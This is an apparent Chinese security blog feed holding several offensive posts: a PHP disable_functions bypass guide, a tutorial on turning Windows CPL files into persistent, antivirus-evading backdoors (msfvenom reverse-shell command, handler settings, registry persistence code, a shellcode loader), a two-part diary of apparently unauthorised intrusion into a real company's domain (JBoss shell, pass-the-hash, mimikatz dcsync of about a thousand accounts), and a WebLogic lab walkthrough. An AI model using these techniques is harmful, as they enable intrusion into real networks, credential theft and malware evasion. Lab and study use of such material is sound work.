href="http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(1st)/">关于原理</a><br>通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令。</p><p>搭建环境</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd AntSword-Labs<span class="hljs-regexp">/bypass_disable_functions/</span><span class="hljs-number">6</span><br>docker-compose up -d<br></code></pre></td></tr></table></figure><p>受到disable_function无法执行命令<br><img src="/img/bypass_disable_function/32.png"></p><p>使用插件成功执行后弹出一个新的虚拟终端，成功bypass<br><img src="/img/bypass_disable_function/31.png"></p><h2 id="利用-Json-Serializer-UAF"><a href="#利用-Json-Serializer-UAF" class="headerlink" title="利用 Json Serializer UAF"></a>利用 Json Serializer UAF</h2><p>利用条件</p><ul><li>Linux 操作系统</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>PHP7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><p><a href="https://bugs.php.net/bug.php?id=77843">利用漏洞</a><br><a href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">POC</a></p><p>上传POC到<code>/var/tmp</code>目录下<br><img src="/img/bypass_disable_function/33.png"></p><p>包含bypass文件</p><p><img src="/img/bypass_disable_function/34.png"></p><p>也可以稍作修改</p><p><img src="/img/bypass_disable_function/35.png"></p><p><img src="/img/bypass_disable_function/36.png"></p><p>当然使用插件是最简单的</p><p><img src="/img/bypass_disable_function/37.png"></p><h2 id="利用Backtrace-UAF"><a href="#利用Backtrace-UAF" class="headerlink" title="利用Backtrace UAF"></a>利用Backtrace UAF</h2><p>利用条件</p><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li><li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li></ul><p><a href="https://bugs.php.net/bug.php?id=76047">利用漏洞</a><br><a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">EXP</a></p><h2 id="利用iconv"><a href="#利用iconv" class="headerlink" title="利用iconv"></a>利用iconv</h2><p>利用条件</p><ul><li>Linux 操作系统</li><li><code>putenv</code></li><li><code>iconv</code></li><li>存在可写的目录, 需要上传 <code>.so</code> 文件</li></ul><p>利用原理分析<a href="https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/">https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/</a></p><p>利用复现:<br>获得镜像</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AntSwordProject/</span>AntSword-Labs.git<br>cd AntSword-Labs<span class="hljs-regexp">/bypass_disable_functions/</span><span class="hljs-number">9</span><br>docker-compose up -d<br></code></pre></td></tr></table></figure><p>无法执行命令<br><img src="/img/bypass_disable_function/44.png"></p><p>使用iconv插件bypass<br><img src="/img/bypass_disable_function/43.png"></p><p>创建副本后,将url改为<code>/.antproxy.php</code><br><img src="/img/bypass_disable_function/45.png"></p><p><img src="/img/bypass_disable_function/46.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#Bypass-3">https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#Bypass-3</a><br><a href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/">https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/</a><br><a href="https://clq0.top/bypass-disable_function-php/#iconv">https://clq0.top/bypass-disable_function-php/#iconv</a><br><a href="https://github.com/AntSwordProject/AntSword-Labs">https://github.com/AntSwordProject/AntSword-Labs</a><br><a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html">https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>巧用cpl文件维权和免杀</title>
    <link href="/2021/07/31/cpl/"/>
    <url>/2021/07/31/cpl/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近无意间发现了cpl文件,之前对该类型的文件了解几乎为零,由于触及到我的知识盲区,于是决定探究。</p><h2 id="cpl文件"><a href="#cpl文件" class="headerlink" title="cpl文件"></a>cpl文件</h2><p>CPL文件，是Windows控制面板扩展项，CPL全拼为<code>Control Panel Item</code><br>在system32目录下有一系列的cpl文件,分别对应着各种控制面板的子选项<br><img src="/img/cpl/1.png"></p><p>列入我们<code>win+R</code>输入<code>main.cpl</code><br><img src="/img/cpl/2.png"></p><p>将会打开控制面板中的鼠标属性<br><img src="/img/cpl/3.png"></p><p>cpl文件本质是属于PE文件<br><img src="/img/cpl/4.png"></p><p>但cpl并不像exe,更像是dll,无法直接打开,只能以加载的形式运行。<br>并且有一个导出函数<code>CPlApplet</code><br>该函数是控制面板应用程序的入口点，它被控制面板管理程序自动调用，且是个回调函数。<br><img src="/img/cpl/5.png"></p><h2 id="如何打开cpl"><a href="#如何打开cpl" class="headerlink" title="如何打开cpl"></a>如何打开cpl</h2><p>1.双击或者win+r xxx.cpl<br>2.control &lt;文件名&gt;<br>3.rundll32 shell32.dll,Control_RunDLL &lt;文件名&gt;<br>注意：所有rundll32 shell32.dll,Control_RunDLL的命令均可用control替代，control.exe实质调用了rundll32.exe。打开后找不到control.exe进程，只能找到rundll32.exe。</p><p><img src="/img/cpl/6.png"></p><p>4.vbs脚本</p><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbs"><span class="hljs-keyword">Dim</span> obj<br><span class="hljs-keyword">Set</span> obj = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>)<br>obj.ControlPanelItem(<span class="hljs-string">&quot;C:\Users\11793\Desktop\cpl.cpl&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/cpl/8.png"></p><p>5.js脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;Shell.Application&quot;</span>);<br>a.ControlPanelItem(<span class="hljs-string">&quot;C:\\Users\\11793\\Desktop\\cpl.cpl&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/cpl/9.png"></p><h2 id="如何自己制造一个cpl文件"><a href="#如何自己制造一个cpl文件" class="headerlink" title="如何自己制造一个cpl文件"></a>如何自己制造一个cpl文件</h2><p>最简单的方式:直接创建一个dll,无需导出函数,然后改后缀名</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-built_in">WinExec</span>(<span class="hljs-string">&quot;Calc.exe&quot;</span>, SW_SHOW);<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>随便一种方式执行<br><img src="/img/cpl/7.png"></p><p>这里既然可以弹出calc.exe,那么能不能执行自己的payload的呢,答案是肯定的。</p><h2 id="cpl文件的应用"><a href="#cpl文件的应用" class="headerlink" title="cpl文件的应用"></a>cpl文件的应用</h2><h3 id="bypass-Windows-AppLocker"><a href="#bypass-Windows-AppLocker" class="headerlink" title="bypass Windows AppLocker"></a>bypass Windows AppLocker</h3><p>什么是<code>Windows AppLocker</code>:<br>AppLocker即“应用程序控制策略”，是Windows 7系统中新增加的一项安全功能。在win7以上的系统中默认都集成了该功能。</p><p>默认的Applocker规则集合,可以看到cpl并不在默认规则中:<br><img src="/img/cpl/18.png"></p><p>开启Applocker规则:<br>打开计算机管理,选择服务,将<code>Application Identity</code>服务开启<br><img src="/img/cpl/19.png"></p><p>然后在安全策略中,添加一条applocker规则,会询问是否添加默认规则<br><img src="/img/cpl/20.png"></p><p>默认规则为:<br><img src="/img/cpl/21.png"></p><p>假设设置某一路径无法执行可执行程序,再次运行时就会提示组策略安全,不允许运行<br><img src="/img/cpl/22.png"></p><p>绕过的方式有很多,这里只讲cpl文件<br>完全可以把代码写入到cpl文件中,同样达到执行目的,这里就弹一个cmd<br><img src="/img/cpl/23.png"></p><h3 id="msf直接生成cpl文件"><a href="#msf直接生成cpl文件" class="headerlink" title="msf直接生成cpl文件"></a>msf直接生成cpl文件</h3><p>生成cpl文件<br><code>msfvenom -p windows/meterpreter/reverse_tcp -b &#39;\x00\xff&#39; lhost=192.168.111.128 lport=8877 -f dll -o cpl.cpl</code><br><img src="/img/cpl/10.png"></p><p>将文件拖到本地并运行,msf监听</p><ul><li>use exploit/multi/handler</li><li>set payload windows/meterpreter/reverse_tcp</li><li>set lhost 192.168.111.128</li><li>set lport 8877</li><li>exploit</li></ul><p><img src="/img/cpl/11.png"><br>这样肯定是不够的,可以把这个cpl文件当作一个后门,做到一个权限维持的效果,且比较隐蔽。<br>将cpl文件名称改为<code>test.cpl</code><br>创建一个项目,作用为修改注册表:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">HKEY hKey;<br>DWORD dwDisposition;<br><span class="hljs-keyword">char</span> path[] = <span class="hljs-string">&quot;C:\\test.cpl&quot;</span>;<br><span class="hljs-built_in">RegCreateKeyExA</span>(HKEY_CURRENT_USER,<span class="hljs-string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, KEY_WRITE, <span class="hljs-literal">NULL</span>, &amp;hKey, &amp;dwDisposition);<br><span class="hljs-built_in">RegSetValueExA</span>(hKey, <span class="hljs-string">&quot;test.cpl&quot;</span>, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)path, (<span class="hljs-number">1</span> + ::<span class="hljs-built_in">lstrlenA</span>(path)));<br></code></pre></td></tr></table></figure><p>不一定将cpl文件放到c盘更目录,可以自定义路径<br>执行后<br><img src="/img/cpl/12.png"><br>然后这里在开启control.exe时,test.cpl文件也会被打开。<br><img src="/img/cpl/13.png"></p><p>如果目标主机有杀软,可以通过该方法白加黑绕过,但是msf的cpl文件特征非常明显,静态太概率都会被杀掉。<br><img src="/img/cpl/14.png"><br>除了加壳之外,寄希望于自己实现加载shellcode,方便做混淆。</p><h3 id="使用shellcode自己做一个cpl文件"><a href="#使用shellcode自己做一个cpl文件" class="headerlink" title="使用shellcode自己做一个cpl文件"></a>使用shellcode自己做一个cpl文件</h3><p>直接上代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;windows.h&quot;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function">VOID <span class="hljs-title">CPlApplet</span><span class="hljs-params">(HWND hwndCPl, UINT msg, LPARAM lParam1, LPARAM lParam2)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;test&quot;</span>, MB_OK);<br>    <span class="hljs-comment">/* length: 835 bytes */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;shellcode&quot;</span>;<br>    LPVOID Memory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf));<br>    ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span>(*)())Memory)();<br>&#125;<br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是最最最最基础的loader<br>先打开<code>control.exe</code>看看效果<br><img src="/img/cpl/15.png"></p><p>看看查杀率</p><p><img src="/img/cpl/16.png"><br>这里上传的文本,shellcode没有做任何的处理,查杀率已经算比较低的,如果混淆一下,很轻松的就可以静态过杀软,再用白加黑,是不是想想就很轻松呢。</p><p>经过一系列处理后,找杀毒能力还比较强的360试一下<br><img src="/img/cpl/17.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html">https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html</a></p><p><a href="https://attack.mitre.org/techniques/T1218/002/">https://attack.mitre.org/techniques/T1218/002/</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows/security/threat-protection/windows-defender-application-control/applocker/working-with-applocker-rules">https://docs.microsoft.com/zh-cn/windows/security/threat-protection/windows-defender-application-control/applocker/working-with-applocker-rules</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透日记一(下)</title>
    <link href="/2021/07/26/br_domain2/"/>
    <url>/2021/07/26/br_domain2/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上次说到,探测到内网三台主机有ms17010的漏洞,准备深挖一波。</p><h2 id="MS17010"><a href="#MS17010" class="headerlink" title="MS17010"></a>MS17010</h2><p>cs上还是不太好打,派生个会话给msf。我的vps是windows server的,一开始下了个windows版的msf在vps上,但是添加路由的时候一直说我参数不对,就不知道咋回事。</p><p><img src="/img/br_domain2/1.png"><br>还是算了,就搞个代理到本机用虚拟机kali吧。我用的是frp,vps当server,虚拟机当client</p><p>vps配置<code>frps.ini</code><br>配一个端口<br><img src="/img/br_domain2/2.png"></p><p>kali配置<code>frpc.ini</code><br><img src="/img/br_domain2/3.png"></p><p>然后vps上命令行启动frps.exe<br><code>frps.exe -c frps.ini</code></p><p><img src="/img/br_domain2/4.png"></p><p>kali执行<br><code>frpc.exe -c frpc.ini</code></p><p><img src="/img/br_domain2/5.png"><br>这样就可以愉快的派生会话了,但是这里最后打的时候三台主机没一台能打下来。首先三台主机都没有开启管道,只能用eterblue模块,最后也没成功,这个域系统安全性还是比较高的。</p><h2 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h2><p>没办法,系统漏洞一台拿不了,但是通过端口扫描发现大量主机开启445端口,于是还是先pass the hash</p><p>批量撞一波<br><img src="/img/br_domain2/7.png"></p><p><img src="/img/br_domain2/8.png"></p><p>断断续续拿下不少主机<br><img src="/img/br_domain2/6.png"></p><p>这时就一台一台的信息收集</p><h2 id="rdp劫持会话"><a href="#rdp劫持会话" class="headerlink" title="rdp劫持会话"></a>rdp劫持会话</h2><p>在27这台主机上发现,有两个会话,上面是我们已知账号和明文密码的普通域内账户,而下面这个用户经过比对,为域中域管用户。<br><img src="/img/br_domain2/9.png"></p><p>由于我们自身权限也高,这里就想rdp上去劫持该会话(当时打的时候比较激动,没注意看这个会话是失效的,这里还是记录一下)<br>看眼时间,应该在休息呢<br><img src="/img/br_domain2/14.png"></p><p>lcx设置代理<br>目标机器上<br><code>shell C:\Windows\system32\lcx.exe -slave 公网ip 7212 127.0.0.1 3389</code><br>vps上<br><code>lcx -listen 7212 5555</code></p><p><img src="/img/br_domain2/10.png"></p><p><img src="/img/br_domain2/11.png"></p><p><img src="/img/br_domain2/12.png"></p><p>在cs上执行<code>shell tscon 2</code><br>他说没有权限。<br><img src="/img/br_domain2/13.png"></p><p>在目标机器执行的时候提示错误的密码,猜想大概是会话断联的原因。如果STATE是active应该是没问题的。</p><h2 id="拿下DC"><a href="#拿下DC" class="headerlink" title="拿下DC"></a>拿下DC</h2><p>将所有拿下的主机的hash全部dump出来,整合后发现有Administrator的账户hash,且是域中账户,而在域中Administrator是作为域管账户的。<br>445端口开启<br><img src="/img/br_domain2/15.png"></p><p>尝试pth<br><img src="/img/br_domain2/16.png"></p><p><img src="/img/br_domain2/17.png"><br>失败了,如果不能pth这个hash将索然无味,又不能拿到明文<br>这里搞了很久,然后又回去信息收集。<br>搞来搞去搞了很久,还是那么7、8台主机,最后也是没办法,由于抓到了很多密码,把所有Administrator用户的hash全部pass了一遍,终于拿下了域控</p><p><img src="/img/br_domain2/18.png"></p><p>导出ntds,抓下密码,这里使用mimikatz<br><code>lsadump::dcsync /domain:xxx /all /csv command</code></p><p><img src="/img/br_domain2/19.png"></p><p><img src="/img/br_domain2/20.png"></p><p>将近一千个用户,RDP他们好像随时都是连着的。</p><p><img src="/img/br_domain2/21.png"></p><p>想3389上去看一下,找一个没有连接的用户</p><p><img src="/img/br_domain2/22.png"></p><p>找到该用户的hash拿去解密</p><p><img src="/img/br_domain2/23.png"></p><p>成功连接</p><p><img src="/img/br_domain2/24.png"></p><p>收工,准备吃晚饭了</p><h2 id="ENDING…"><a href="#ENDING…" class="headerlink" title="ENDING…"></a>ENDING…</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透日记一(上)</title>
    <link href="/2021/07/23/br_domain1/"/>
    <url>/2021/07/23/br_domain1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于最近学习内网,打了一些靶场,觉得还是挺枯燥的,就想找一个真实的环境练练手,在hxd的指引下,找了个站去练练手。</p><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><p>上来就是一个jboss界面</p><p><img src="/img/br_domain/1.png"></p><p>随手一点,<code>JMX Console</code>竟然可以直接进。<br><img src="/img/br_domain/2.png"></p><p>这里最经典的玩法就是war包的远程部署</p><p>找到<code>jboss.deployment</code><br><img src="/img/br_domain/3.png"></p><p>进入后找到<code>void addURL()</code></p><p><img src="/img/br_domain/4.png"><br>这里网上有很多文章写这个玩法,这里就不复现了。</p><p>而前辈们早已写出了集成化工具,放到脚本工具上跑一下看看</p><p><img src="/img/br_domain/5.png"></p><p>脚本显示有两个漏洞,其中一个就是<code>JMX Console</code>,直接让脚本跑一下试试。</p><p>直接反弹了一个shell<br><img src="/img/br_domain/6.png"></p><p>由于这个shell比较脆弱,这里大致查查进程(无AV),看看管理员登录时间和网卡信息等等。</p><p><img src="/img/br_domain/7.png"></p><p><img src="/img/br_domain/10.png"></p><p><img src="/img/br_domain/8.png"></p><p><img src="/img/br_domain/9.png"></p><p>可以看到是有域的</p><p><img src="/img/br_domain/11.png"></p><p>大致了解了情况后就想直接走后渗透,ping下度娘看下机器出不出网。</p><p><img src="/img/br_domain/12.png"><br>是出网的,由于是国外的机器ping就比较高,由于无杀软,所以准备直接powershell上线</p><p><img src="/img/br_domain/13.png"><br>因为后来发现域很大,派生了一个会话来操作。</p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><p>权限很高,上来先把hash抓到,心安一点。</p><p><img src="/img/br_domain/14.png"></p><p><img src="/img/br_domain/15.png"></p><p>一开始没注意仔细看,这里已经发现当前主机所在的域名</p><p><img src="/img/br_domain/16.png"></p><p>由于是在域中,通过dns大致定位域控ip<br><img src="/img/br_domain/17.png"></p><p>不急着打域控,先做一波信息收集</p><h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p>查询域数量<br><img src="/img/br_domain/18.png"></p><p>查询域内计算机列表<br><img src="/img/br_domain/20.png"></p><p>查询域管账户<code>net group &quot;domain admins&quot; /domain </code><br><img src="/img/br_domain/19.png"></p><p>查询域控账户<code>shell net group &quot;domain controllers&quot; /domain</code><br><img src="/img/br_domain/21.png"></p><p>这里04和53的后缀和刚刚DNS的后缀是一样的,确认域控机器和账户</p><p>查询域内用户<code>shell net user /domain</code></p><p><img src="/img/br_domain/22.png"></p><p>这一个域大概是三四百个用户账号,还是比较大的</p><p>查询域所用主机名<code>shell net group &quot;domain computers&quot; /domain</code></p><p><img src="/img/br_domain/23.png"><br>主机也有一百多台</p><p><code>shell net accounts /domain</code>查看域账户属性,没有要求强制更改密码</p><p><img src="/img/br_domain/24.png"></p><p><code>shell nltest /domain_trusts</code>域信任信息</p><p><img src="/img/br_domain/25.png"></p><p><code>shell net group /domain</code>查看域中组信息<br><img src="/img/br_domain/30.png"></p><p><code>net use</code>查看是否有ipc连接,<code>net share</code>查看共享<br><img src="/img/br_domain/26.png"></p><p>但是这里<code>net session</code>有几台,这是其他主机连接本机的ipc连接<br><img src="/img/br_domain/31.png"></p><h3 id="spn扫描"><a href="#spn扫描" class="headerlink" title="spn扫描"></a>spn扫描</h3><p>机器在域内了,spn是不得不看一下的,比起端口扫描更精确,也更加隐蔽,这是由于SPN扫描通过域控制器的LDAP进行服务查询,而这正是Kerberos票据行为的一部分。<br>windows自带了一款工具:setspn<br><code>shell setspn -T xxxx -Q */*</code></p><p>这里就可以看到28机器有MSSQL服务,开启1433端口<br><img src="/img/br_domain/27.png"></p><p>这里服务确实有点太多了,为了方便就将结果输出到文本<br><img src="/img/br_domain/28.png"></p><p>将主机名列出<br><code>grep &quot;CN=&quot; spn.txt | awk -F &quot;,&quot; &#123;&#39;print $1&#39;&#125; | awk -F &quot;=&quot; &#123;&#39;print $2&#39;&#125; &gt; host.txt</code><br><img src="/img/br_domain/29.png"></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>上来先试试pth域控,无果,又尝试扫描MS17010,也没有洞,只能去先横向其他的主机。通过上面net session,发现一个与当前主机用户名相同的账户名称,尝试psexec传递hash<br>拿下该主机</p><p><img src="/img/br_domain/33.png"></p><p>这个session有一个作用就是盗取令牌,创建更高权限账户的进程,比如域管的cmd这种,但是这里我对比了net session的用户名和域管用户的用户名,发现没有一个是相同的,这个方法也就不去尝试了。</p><p>批量扫一波MS17010,这个域的防御性比较高,只有零星几台有漏洞。</p><p><img src="/img/br_domain/34.png"></p><p><img src="/img/br_domain/35.png"></p><p><img src="/img/br_domain/36.png"></p><p>并且同网段没有,只有0,2,3段各一台,这里就像先把他们都先拿下,看OS版本应该是没问题的,准备派生会话给msf去打。但天色一晚,歇息了,歇息了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>域渗透之黄金票据权限维持</title>
    <link href="/2021/07/21/hongri2/"/>
    <url>/2021/07/21/hongri2/</url>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>DC：</p><ul><li>IP：10.10.10.10</li><li>OS：Windows 2012</li></ul><p>WEB：</p><ul><li>IP1：10.10.10.80</li><li>IP2：192.168.111.80</li><li>OS：Windows 2008</li><li>网站搭建:Weblogic 10.3.6 MSSQL 2008</li></ul><p>PC：</p><ul><li>IP1：10.10.10.201</li><li>IP2：192.168.111.201</li><li>OS：Windows 7</li></ul><p>攻击机：</p><ul><li>IP：192.168.111.129</li><li>OS：Windows 10</li><li>IP：192.168.111.128</li><li>OS：Kali</li></ul><p>内网网段：10.10.10.0/24<br>DMZ网段：192.168.111.0/24</p><p>进入<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>目录下管理员身份开启startWeblogic批处理程序<br><img src="/img/hongri2/2.png"></p><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><p>使用nmap扫描端口<br><img src="/img/hongri2/3.png"></p><p>有445 SMB,3389 RDP登端口开启<br>1433端口和7001端口分别是是MSSQL和Weblogic服务<br><img src="/img/hongri2/4.png"></p><p>访问端口看看<br><img src="/img/hongri2/5.png"><br>这里有个报错,我们先不管,由于是WebLogic,默认目录<code>http://xxxxxx:7001/console</code>下为后台管理页面登录<br><img src="/img/hongri2/6.png"></p><p>尝试弱密码后无果,使用工具尝试WebLogic漏反序列化漏洞,即CVE-2019-2725<br><img src="/img/hongri2/7.png"></p><p>命令也能成功执行<br><img src="/img/hongri2/8.png"></p><p>这里就想上传一个稳定的webshell,用其他更强大的webshell工具去连<br><img src="/img/hongri2/9.png"></p><p>于是就想传一个webshell,用其他webshell工具去连<br>上传冰蝎jsp马到目录<code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</code><br><img src="/img/hongri2/10.png"></p><p>连接成功<br><img src="/img/hongri2/11.png"></p><p>这里已经发现是一张双网卡主机,有可能10段通向内网<br><img src="/img/hongri2/12.png"></p><p>无ipc连接,net view命令无法使用<br><img src="/img/hongri2/13.png"></p><p>并已知是域内主机<br><img src="/img/hongri2/14.png"></p><p>查看进程无杀软,也无浏览器等信息(无法抓取浏览器密码),并且net命令返回ERROR 5 这是没有权限,于是准备反弹shell到后渗透神器cs,进行提权等操作</p><p><img src="/img/hongri2/15.png"></p><p><img src="/img/hongri2/16.png"></p><h2 id="后渗透-内网漫游"><a href="#后渗透-内网漫游" class="headerlink" title="后渗透(内网漫游)"></a>后渗透(内网漫游)</h2><h3 id="提权及信息获取"><a href="#提权及信息获取" class="headerlink" title="提权及信息获取"></a>提权及信息获取</h3><p>直接powershell上线<br><img src="/img/hongri2/17.png"></p><p>甜土豆进行提权<br><img src="/img/hongri2/18.png"></p><p>通过<code>nslookup</code>查询dns记录,这里查到一个<code>10.10.10.10</code>的ip,在域内,这个ip很有可能就是域控<br><img src="/img/hongri2/19.png"></p><p>又通过<code>net time</code>查到主域名称<br><img src="/img/hongri2/20.png"></p><p>抓取本机密码<br><img 